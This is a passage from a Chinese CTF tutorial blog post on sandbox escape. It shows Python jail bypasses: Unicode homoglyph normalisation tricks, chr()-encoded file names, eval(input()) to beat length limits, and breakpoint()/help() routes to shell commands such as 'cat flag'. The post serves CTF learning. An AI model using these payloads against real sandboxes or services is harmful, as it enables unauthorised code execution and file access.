@@ -1,0 +1,466 @@
+<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>MIsc-沙箱逃逸 - ⚡Lunatic BLOG⚡</title><meta name=author content="Lunatic"><meta name=description content="这篇博客用来记录一下沙箱逃逸相关的一些知识点
+"><meta name=keywords content='Misc,CTF'><meta itemprop=name content="MIsc-沙箱逃逸"><meta itemprop=description content="这篇博客用来记录一下沙箱逃逸相关的一些知识点"><meta itemprop=datePublished content="2023-08-22T22:34:46+08:00"><meta itemprop=dateModified content="2023-08-22T22:34:46+08:00"><meta itemprop=wordCount content="1067"><meta itemprop=keywords content="Misc,CTF"><meta property="og:url" content="https://goodlunatic.github.io/posts/442fd1d/"><meta property="og:site_name" content="⚡Lunatic BLOG⚡"><meta property="og:title" content="MIsc-沙箱逃逸"><meta property="og:description" content="这篇博客用来记录一下沙箱逃逸相关的一些知识点"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-22T22:34:46+08:00"><meta property="article:modified_time" content="2023-08-22T22:34:46+08:00"><meta property="article:tag" content="Misc"><meta property="article:tag" content="CTF"><meta name=twitter:card content="summary"><meta name=twitter:title content="MIsc-沙箱逃逸"><meta name=twitter:description content="这篇博客用来记录一下沙箱逃逸相关的一些知识点"><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical type=text/html href=https://goodlunatic.github.io/posts/442fd1d/ title="MIsc-沙箱逃逸 - ⚡Lunatic BLOG⚡"><link rel=prev type=text/html href=https://goodlunatic.github.io/posts/5e91e89/ title=CTF-Pwn学习记录><link rel=next type=text/html href=https://goodlunatic.github.io/posts/940b876/ title="2023 羊城杯网络安全大赛 Misc Writeup"><link rel=alternate type=text/markdown href=https://goodlunatic.github.io/posts/442fd1d/index.md title="MIsc-沙箱逃逸 - ⚡Lunatic BLOG⚡"><link rel=stylesheet href=/css/config.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"MIsc-沙箱逃逸","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/goodlunatic.github.io\/posts\/442fd1d\/"},"genre":"posts","keywords":"Misc, CTF","wordcount":1067,"url":"https:\/\/goodlunatic.github.io\/posts\/442fd1d\/","datePublished":"2023-08-22T22:34:46+08:00","dateModified":"2023-08-22T22:34:46+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Lunatic"},"description":""}</script><script src=/js/head/color-scheme.min.js></script></head><body data-header-desktop=sticky data-header-mobile=auto><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper data-github-corner=left><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容…… id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
+</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
+</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容…… id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
+</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
+</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></li><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=fi-container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集><div class="details collection-details open"><div class="details-summary collection-summary"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i>
+<span class=collection-name title=合集>CTF-Misc入门指南</span>
+<span class=collection-count>8</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content collection-content"><nav><ul class=collection-list><li class=collection-item><a href=/posts/1ad9200/ title="[持续更新] CTF-Misc Guide">[持续更新] CTF-Misc Guide</a></li><li class=collection-item><a href=/posts/c5bc8a2/ title=Misc-AI安全>Misc-AI安全</a></li><li class=collection-item><a href=/posts/761da51/ title=Misc-数字取证>Misc-数字取证</a></li><li class=collection-item><a href=/posts/5422d65/ title=Misc-流量分析>Misc-流量分析</a></li><li class=collection-item><a href=/posts/c49ae8a/ title=Misc-数据安全>Misc-数据安全</a></li><li class=collection-item><a href=/posts/01ebd40/ title=Misc-工控安全>Misc-工控安全</a></li><li class=collection-item><span class=active title=MIsc-沙箱逃逸>MIsc-沙箱逃逸</span></li><li class=collection-item><a href=/posts/3e9e231/ title=Misc-区块链安全>Misc-区块链安全</a></li></ul><div class=collection-nav-simple><a href=/posts/01ebd40/ class=collection-nav-item rel=prev title=Misc-工控安全><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i></a><span class=text-secondary>7/8</span><a href=/posts/3e9e231/ class=collection-nav-item rel=next title=Misc-区块链安全><i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></nav></div></div><div class="details related-details open"><div class="details-summary related-summary"><i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden=true></i>
+<span class=related-title>相关内容</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content related-content"><ul class=related-list><li class=related-item><a href=/posts/3e9e231/ title=Misc-区块链安全>Misc-区块链安全</a></li><li class=related-item><a href=/posts/5e91e89/ title=CTF-Pwn学习记录>CTF-Pwn学习记录</a></li><li class=related-item><a href=/posts/d7eced5/ title=CTF-Pwn刷题记录>CTF-Pwn刷题记录</a></li><li class=related-item><a href=/posts/3f7db4e/ title="2022 浙江省大学生网络与信息安全竞赛 Writeup">2022 浙江省大学生网络与信息安全竞赛 Writeup</a></li></ul></div></div><div class=aside-custom><a href target=_blank rel=external><img src=/images/zsxq.webp alt="Lunatic Planet QR code" width=100%></a></div></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span title=转载 class=icon-repost><i class="fa-solid fa-share fa-fw" aria-hidden=true></i></span><span>MIsc-沙箱逃逸</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://goodlunatic.github.io title=作者 target=_blank rel="external nofollow noopener noreferrer author" class=author><img class=avatar src=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png alt=Lunatic height=16 width=16>&nbsp;Lunatic</a></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/ctf/ class=post-category title="分类 - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> CTF</a> 和 <a href=/collections/ctf-misc%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/ class=post-collection title="合集 - CTF-Misc入门指南"><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i> CTF-Misc入门指南</a></span></div><div class=post-meta-line><span title="发布于 2023-08-22 22:34:46"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2023-08-22>2023-08-22</time></span>&nbsp;<span title="1067 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 1100 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 6 分钟</span>&nbsp;<span id=busuanzi_container_page_pv class="busuanzi_visitors comment-visitors" data-flag-title=MIsc-沙箱逃逸><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_page_pv>-</span>&nbsp;次阅读
+</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#python-沙箱逃逸pyjail>Python 沙箱逃逸(pyjail)</a><ul><li><a href=#常见的绕过方法>常见的绕过方法</a></li></ul></li><li><a href=#vm沙箱逃逸>VM沙箱逃逸</a><ul><li><a href=#vm沙箱逃逸-1>VM沙箱逃逸</a></li><li><a href=#vm2沙箱逃逸>VM2沙箱逃逸</a></li><li><a href=#示例题目>示例题目</a><ul><li><a href=#例题-2023hznuctf-eznode>例题-2023HZNUCTF eznode</a></li></ul></li></ul></li></ul></nav></div></div><div class=content id=content><p><strong>这篇博客用来记录一下沙箱逃逸相关的一些知识点</strong></p><h2 class=heading-element id=python-沙箱逃逸pyjail><span>Python 沙箱逃逸(pyjail)</span>
+<a href=#python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8pyjail class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>获取常用的unicode碰撞字符</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>unicodedata</span> <span class=kn>import</span> <span class=n>normalize</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=n>ascii_lowercase</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>defaultdict</span>
+</span></span><span class=line><span class=cl><span class=n>lst</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>ascii_lowercase</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>dic</span> <span class=o>=</span> <span class=n>defaultdict</span><span class=p>(</span><span class=nb>list</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>lst</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x110000</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>normalize</span><span class=p>(</span><span class=s2>&#34;NFKC&#34;</span><span class=p>,</span> <span class=nb>chr</span><span class=p>(</span><span class=n>i</span><span class=p>))</span> <span class=o>==</span> <span class=n>char</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>dic</span><span class=p>[</span><span class=n>char</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>dic</span><span class=p>[</span><span class=n>char</span><span class=p>])</span> <span class=o>&gt;</span> <span class=mi>9</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>key</span><span class=p>,</span><span class=n>value</span> <span class=ow>in</span> <span class=n>dic</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=n>value</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a [&#39;a&#39;, &#39;ª&#39;, &#39;ᵃ&#39;, &#39;ₐ&#39;, &#39;ⓐ&#39;, &#39;ａ&#39;, &#39;𝐚&#39;, &#39;𝑎&#39;, &#39;𝒂&#39;, &#39;𝒶&#39;]
+</span></span><span class=line><span class=cl>b [&#39;b&#39;, &#39;ᵇ&#39;, &#39;ⓑ&#39;, &#39;ｂ&#39;, &#39;𝐛&#39;, &#39;𝑏&#39;, &#39;𝒃&#39;, &#39;𝒷&#39;, &#39;𝓫&#39;, &#39;𝔟&#39;]
+</span></span><span class=line><span class=cl>c [&#39;c&#39;, &#39;ᶜ&#39;, &#39;ⅽ&#39;, &#39;ⓒ&#39;, &#39;ｃ&#39;, &#39;𝐜&#39;, &#39;𝑐&#39;, &#39;𝒄&#39;, &#39;𝒸&#39;, &#39;𝓬&#39;]
+</span></span><span class=line><span class=cl>d [&#39;d&#39;, &#39;ᵈ&#39;, &#39;ⅆ&#39;, &#39;ⅾ&#39;, &#39;ⓓ&#39;, &#39;ｄ&#39;, &#39;𝐝&#39;, &#39;𝑑&#39;, &#39;𝒅&#39;, &#39;𝒹&#39;]
+</span></span><span class=line><span class=cl>e [&#39;e&#39;, &#39;ᵉ&#39;, &#39;ₑ&#39;, &#39;ℯ&#39;, &#39;ⅇ&#39;, &#39;ⓔ&#39;, &#39;ｅ&#39;, &#39;𝐞&#39;, &#39;𝑒&#39;, &#39;𝒆&#39;]
+</span></span><span class=line><span class=cl>f [&#39;f&#39;, &#39;ᶠ&#39;, &#39;ⓕ&#39;, &#39;ｆ&#39;, &#39;𝐟&#39;, &#39;𝑓&#39;, &#39;𝒇&#39;, &#39;𝒻&#39;, &#39;𝓯&#39;, &#39;𝔣&#39;]
+</span></span><span class=line><span class=cl>g [&#39;g&#39;, &#39;ᵍ&#39;, &#39;ℊ&#39;, &#39;ⓖ&#39;, &#39;ｇ&#39;, &#39;𝐠&#39;, &#39;𝑔&#39;, &#39;𝒈&#39;, &#39;𝓰&#39;, &#39;𝔤&#39;]
+</span></span><span class=line><span class=cl>h [&#39;h&#39;, &#39;ʰ&#39;, &#39;ₕ&#39;, &#39;ℎ&#39;, &#39;ⓗ&#39;, &#39;ｈ&#39;, &#39;𝐡&#39;, &#39;𝒉&#39;, &#39;𝒽&#39;, &#39;𝓱&#39;]
+</span></span><span class=line><span class=cl>i [&#39;i&#39;, &#39;ᵢ&#39;, &#39;ⁱ&#39;, &#39;ℹ&#39;, &#39;ⅈ&#39;, &#39;ⅰ&#39;, &#39;ⓘ&#39;, &#39;ｉ&#39;, &#39;𝐢&#39;, &#39;𝑖&#39;]
+</span></span><span class=line><span class=cl>j [&#39;j&#39;, &#39;ʲ&#39;, &#39;ⅉ&#39;, &#39;ⓙ&#39;, &#39;ⱼ&#39;, &#39;ｊ&#39;, &#39;𝐣&#39;, &#39;𝑗&#39;, &#39;𝒋&#39;, &#39;𝒿&#39;]
+</span></span><span class=line><span class=cl>k [&#39;k&#39;, &#39;ᵏ&#39;, &#39;ₖ&#39;, &#39;ⓚ&#39;, &#39;ｋ&#39;, &#39;𝐤&#39;, &#39;𝑘&#39;, &#39;𝒌&#39;, &#39;𝓀&#39;, &#39;𝓴&#39;]
+</span></span><span class=line><span class=cl>l [&#39;l&#39;, &#39;ˡ&#39;, &#39;ₗ&#39;, &#39;ℓ&#39;, &#39;ⅼ&#39;, &#39;ⓛ&#39;, &#39;ｌ&#39;, &#39;𝐥&#39;, &#39;𝑙&#39;, &#39;𝒍&#39;]
+</span></span><span class=line><span class=cl>m [&#39;m&#39;, &#39;ᵐ&#39;, &#39;ₘ&#39;, &#39;ⅿ&#39;, &#39;ⓜ&#39;, &#39;ｍ&#39;, &#39;𝐦&#39;, &#39;𝑚&#39;, &#39;𝒎&#39;, &#39;𝓂&#39;]
+</span></span><span class=line><span class=cl>n [&#39;n&#39;, &#39;ⁿ&#39;, &#39;ₙ&#39;, &#39;ⓝ&#39;, &#39;ｎ&#39;, &#39;𝐧&#39;, &#39;𝑛&#39;, &#39;𝒏&#39;, &#39;𝓃&#39;, &#39;𝓷&#39;]
+</span></span><span class=line><span class=cl>o [&#39;o&#39;, &#39;º&#39;, &#39;ᵒ&#39;, &#39;ₒ&#39;, &#39;ℴ&#39;, &#39;ⓞ&#39;, &#39;ｏ&#39;, &#39;𝐨&#39;, &#39;𝑜&#39;, &#39;𝒐&#39;]
+</span></span><span class=line><span class=cl>p [&#39;p&#39;, &#39;ᵖ&#39;, &#39;ₚ&#39;, &#39;ⓟ&#39;, &#39;ｐ&#39;, &#39;𝐩&#39;, &#39;𝑝&#39;, &#39;𝒑&#39;, &#39;𝓅&#39;, &#39;𝓹&#39;]
+</span></span><span class=line><span class=cl>q [&#39;q&#39;, &#39;ⓠ&#39;, &#39;ｑ&#39;, &#39;𝐪&#39;, &#39;𝑞&#39;, &#39;𝒒&#39;, &#39;𝓆&#39;, &#39;𝓺&#39;, &#39;𝔮&#39;, &#39;𝕢&#39;]
+</span></span><span class=line><span class=cl>r [&#39;r&#39;, &#39;ʳ&#39;, &#39;ᵣ&#39;, &#39;ⓡ&#39;, &#39;ｒ&#39;, &#39;𝐫&#39;, &#39;𝑟&#39;, &#39;𝒓&#39;, &#39;𝓇&#39;, &#39;𝓻&#39;]
+</span></span><span class=line><span class=cl>s [&#39;s&#39;, &#39;ſ&#39;, &#39;ˢ&#39;, &#39;ₛ&#39;, &#39;ⓢ&#39;, &#39;ｓ&#39;, &#39;𝐬&#39;, &#39;𝑠&#39;, &#39;𝒔&#39;, &#39;𝓈&#39;]
+</span></span><span class=line><span class=cl>t [&#39;t&#39;, &#39;ᵗ&#39;, &#39;ₜ&#39;, &#39;ⓣ&#39;, &#39;ｔ&#39;, &#39;𝐭&#39;, &#39;𝑡&#39;, &#39;𝒕&#39;, &#39;𝓉&#39;, &#39;𝓽&#39;]
+</span></span><span class=line><span class=cl>u [&#39;u&#39;, &#39;ᵘ&#39;, &#39;ᵤ&#39;, &#39;ⓤ&#39;, &#39;ｕ&#39;, &#39;𝐮&#39;, &#39;𝑢&#39;, &#39;𝒖&#39;, &#39;𝓊&#39;, &#39;𝓾&#39;]
+</span></span><span class=line><span class=cl>v [&#39;v&#39;, &#39;ᵛ&#39;, &#39;ᵥ&#39;, &#39;ⅴ&#39;, &#39;ⓥ&#39;, &#39;ｖ&#39;, &#39;𝐯&#39;, &#39;𝑣&#39;, &#39;𝒗&#39;, &#39;𝓋&#39;]
+</span></span><span class=line><span class=cl>w [&#39;w&#39;, &#39;ʷ&#39;, &#39;ⓦ&#39;, &#39;ｗ&#39;, &#39;𝐰&#39;, &#39;𝑤&#39;, &#39;𝒘&#39;, &#39;𝓌&#39;, &#39;𝔀&#39;, &#39;𝔴&#39;]
+</span></span><span class=line><span class=cl>x [&#39;x&#39;, &#39;ˣ&#39;, &#39;ₓ&#39;, &#39;ⅹ&#39;, &#39;ⓧ&#39;, &#39;ｘ&#39;, &#39;𝐱&#39;, &#39;𝑥&#39;, &#39;𝒙&#39;, &#39;𝓍&#39;]
+</span></span><span class=line><span class=cl>y [&#39;y&#39;, &#39;ʸ&#39;, &#39;ⓨ&#39;, &#39;ｙ&#39;, &#39;𝐲&#39;, &#39;𝑦&#39;, &#39;𝒚&#39;, &#39;𝓎&#39;, &#39;𝔂&#39;, &#39;𝔶&#39;]
+</span></span><span class=line><span class=cl>z [&#39;z&#39;, &#39;ᶻ&#39;, &#39;ⓩ&#39;, &#39;ｚ&#39;, &#39;𝐳&#39;, &#39;𝑧&#39;, &#39;𝒛&#39;, &#39;𝓏&#39;, &#39;𝔃&#39;, &#39;𝔷&#39;]</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=常见的绕过方法><span>常见的绕过方法</span>
+<a href=#%e5%b8%b8%e8%a7%81%e7%9a%84%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;os&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;cat flag&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=mi>102</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>103</span><span class=p>))</span><span class=o>.</span><span class=n>read</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#先输入eval(input())绕过字数限制</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=mi>102</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>103</span><span class=p>))</span><span class=o>.</span><span class=n>read</span><span class=p>())</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#使用Unicode字符绕过过滤</span>
+</span></span><span class=line><span class=cl><span class=n>ᵉval</span><span class=p>(</span><span class=n>inpᵘt</span><span class=p>())</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#使用breakpoint()函数下断点进入Pdb，然后再输入命令</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#输入help()</span>
+</span></span><span class=line><span class=cl><span class=c1>#再输入sys</span>
+</span></span><span class=line><span class=cl><span class=c1>#然后输入!cat flag获取flag</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#在help()中可以输入__main__或者__dict__查看是否有信息泄露</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
